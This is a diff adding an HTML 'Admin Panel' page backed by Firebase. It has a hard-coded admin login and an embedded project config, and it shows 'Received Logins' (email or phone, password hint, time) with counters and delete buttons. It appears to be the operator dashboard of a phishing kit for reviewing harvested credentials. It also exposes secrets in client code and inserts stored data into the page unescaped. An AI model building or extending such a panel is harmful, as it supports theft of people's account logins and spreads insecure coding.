@@ -1,0 +1,286 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Admin Panel</title>
+<style>
+:root{
+  --bg1:#0f2027;
+  --bg2:#203a43;
+  --bg3:#2c5364;
+  --glass:rgba(255,255,255,0.05);
+  --blur:20px;
+  --accent:#ff3b94;
+  --text:#fff;
+  --textMuted:rgba(255,255,255,0.6);
+}
+*{box-sizing:border-box;font-family:Inter,Arial,sans-serif;transition:.3s;}
+body{
+  margin:0;
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:flex-start;
+  background:linear-gradient(135deg,var(--bg1),var(--bg2),var(--bg3));
+  background-size:400% 400%;
+  animation:bgMove 15s ease infinite;
+  padding:40px 20px;
+  color:var(--text);
+}
+@keyframes bgMove{
+  0%{background-position:0% 50%;}
+  50%{background-position:100% 50%;}
+  100%{background-position:0% 50%;}
+}
+.card{
+  backdrop-filter:blur(var(--blur));
+  background:var(--glass);
+  border:1px solid rgba(255,255,255,0.2);
+  border-radius:16px;
+  padding:24px;
+  max-width:700px;
+  width:100%;
+  text-align:center;
+  box-shadow:0 8px 28px rgba(0,0,0,0.4);
+  animation:fadeIn 0.8s ease;
+}
+h2{margin-bottom:20px;}
+input{
+  width:100%;
+  padding:12px;
+  border-radius:10px;
+  border:none;
+  margin:10px 0;
+  background:rgba(255,255,255,0.15);
+  color:#fff;
+}
+input::placeholder{color:var(--textMuted);}
+button{
+  padding:10px 16px;
+  border:none;
+  border-radius:10px;
+  cursor:pointer;
+  background:var(--accent);
+  color:#fff;
+  font-weight:600;
+  margin-top:10px;
+  width:100%;
+}
+button:hover{opacity:.85;transform:translateY(-2px);}
+#panel{display:none;max-height:70vh;overflow-y:auto;margin-top:20px;}
+.pwWrap{position:relative;}
+.pwWrap svg{
+  position:absolute;
+  right:12px;
+  top:50%;
+  transform:translateY(-50%);
+  width:20px;
+  cursor:pointer;
+  opacity:.7;
+}
+.hidden{display:none!important;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
+table{
+  width:100%;
+  border-collapse:collapse;
+  margin-top:12px;
+}
+th,td{
+  text-align:left;
+  padding:8px 12px;
+  font-family:monospace;
+}
+th{border-bottom:1px solid rgba(255,255,255,0.3);}
+tr:hover{background:rgba(255,255,255,0.1);}
+.delBtn{
+  background:#ff0000;
+  padding:4px 8px;
+  font-size:12px;
+  border:none;
+  border-radius:6px;
+  cursor:pointer;
+}
+.delBtn:hover{opacity:.85;}
+#searchBar{
+  padding:10px;
+  margin-bottom:12px;
+  border-radius:8px;
+  border:none;
+  background:rgba(255,255,255,0.1);
+  color:#fff;
+}
+#counters{
+  display:flex;
+  gap:12px;
+  margin-bottom:16px;
+  justify-content:space-between;
+}
+.counterBox{
+  flex:1;
+  background:rgba(255,255,255,0.1);
+  padding:12px;
+  border-radius:10px;
+  font-weight:600;
+}
+</style>
+</head>
+<body>
+
+<div id="loginCard" class="card">
+  <h2>Admin Login</h2>
+  <div class="pwWrap">
+    <input id="adminUser" placeholder="Username"/>
+  </div>
+  <div class="pwWrap">
+    <input id="adminPass" type="password" placeholder="Password"/>
+    <svg id="eye" viewBox="0 0 24 24">
+      <path id="eyeOpen" fill="currentColor" d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 110-10 5 5 0 010 10z"/>
+      <path id="eyeSlash" class="hidden" fill="currentColor" d="M3 3l18 18-1.5 1.5L18 20c-2.5 2-5 3-6 3-7 0-11-7-11-7 1.1-1.9 2.6-3.5 4.2-5L1.5 4.5 3 3z"/>
+    </svg>
+  </div>
+  <button id="btnLogin">Login</button>
+</div>
+
+<div id="panel" class="card">
+  <h2>Received Logins</h2>
+
+  <div id="counters">
+    <div class="counterBox">Total: <span id="totalLogins">0</span></div>
+    <div class="counterBox">This Week: <span id="weekLogins">0</span></div>
+    <div class="counterBox">Today: <span id="todayLogins">0</span></div>
+  </div>
+
+  <input type="text" id="searchBar" placeholder="Search email or number..."/>
+  <table>
+    <thead>
+      <tr>
+        <th>Email / Number</th>
+        <th>Password Hint</th>
+        <th>Time</th>
+        <th>Action</th>
+      </tr>
+    </thead>
+    <tbody id="loginList"></tbody>
+  </table>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
+import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-database.js";
+import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-analytics.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyD8KAm2FHtdUr4xilbVGZyVSGGdu2vyYiE",
+  authDomain: "w3bsite-aa4a3.firebaseapp.com",
+  databaseURL: "https://w3bsite-aa4a3-default-rtdb.firebaseio.com",
+  projectId: "w3bsite-aa4a3",
+  storageBucket: "w3bsite-aa4a3.firebasestorage.app",
+  messagingSenderId: "510630950165",
+  appId: "1:510630950165:web:b5f0cbbbbac127c7ece51c",
+  measurementId: "G-9LPYJJ3D5E"
+};
+
+const app = initializeApp(firebaseConfig);
+try { getAnalytics(app); } catch(e){ console.warn('Analytics skipped'); }
+const db = getDatabase(app);
+
+const ADMIN_USER = "blue";
+const ADMIN_PASS = "shimono08";
+
+const loginCard = document.getElementById('loginCard');
+const panel = document.getElementById('panel');
+const loginList = document.getElementById('loginList');
+const eye = document.getElementById('eye');
+const adminPass = document.getElementById('adminPass');
+const eyeOpen = document.getElementById('eyeOpen');
+const eyeSlash = document.getElementById('eyeSlash');
+
+const totalEl = document.getElementById('totalLogins');
+const weekEl = document.getElementById('weekLogins');
+const todayEl = document.getElementById('todayLogins');
+const searchBar = document.getElementById('searchBar');
+
+// Password toggle
+eye.onclick = ()=>{
+  if(adminPass.type==="password"){
+    adminPass.type="text";
+    eyeOpen.classList.add("hidden");
+    eyeSlash.classList.remove("hidden");
+  } else {
+    adminPass.type="password";
+    eyeSlash.classList.add("hidden");
+    eyeOpen.classList.remove("hidden");
+  }
+};
+
+function updateCounters(arr){
+  const now = new Date();
+  let total = arr.length;
+  let weekCount = 0;
+  let todayCount = 0;
+
+  arr.forEach(item=>{
+    if(!item.time) return;
+    const t = new Date(item.time);
+    const weekDiff = (now - t)/(1000*60*60*24);
+    if(weekDiff <= 7) weekCount++;
+    if(now.toDateString() === t.toDateString()) todayCount++;
+  });
+
+  totalEl.textContent = total;
+  weekEl.textContent = weekCount;
+  todayEl.textContent = todayCount;
+}
+
+document.getElementById('btnLogin').onclick = () => {
+    const user = document.getElementById('adminUser').value.trim();
+    const pass = adminPass.value.trim();
+    
+    if(user === ADMIN_USER && pass === ADMIN_PASS){
+        loginCard.style.display = 'none';
+        panel.style.display = 'block';
+
+        const loginsRef = ref(db,'logins/');
+        onValue(loginsRef, snapshot => {
+            const data = snapshot.val();
+            let arr = [];
+            loginList.innerHTML = '';
+            if(data){
+              for(const k in data){
+                  const item = {...data[k], key:k};
+                  arr.push(item);
+                  const tr = document.createElement('tr');
+                  tr.innerHTML = `
+                    <td>${item.email}</td>
+                    <td>${item.pwd_hint}</td>
+                    <td>${item.time}</td>
+                    <td><button class="delBtn" onclick="deleteEntry('${k}')">Del</button></td>
+                  `;
+                  loginList.appendChild(tr);
+              }
+            }
+            updateCounters(arr);
+        });
+    } else {
+        alert('Invalid username or password');
+    }
+};
+
+window.deleteEntry = function(key){
+    if(confirm('Delete this login?')){
+        remove(ref(db,'logins/'+key));
+    }
+};
+
+// SEARCH FILTER
+searchBar.addEventListener('input', ()=>{
+  const val = searchBar.value.toLowerCase();
+  Array.from(loginList.children).forEach(tr=>{
+    const text = tr.textContent.toLowerCase();
+    tr.style.display = text.includes(val)?'':'none';
+  });
+});
+</script>
+</body>
+</html>
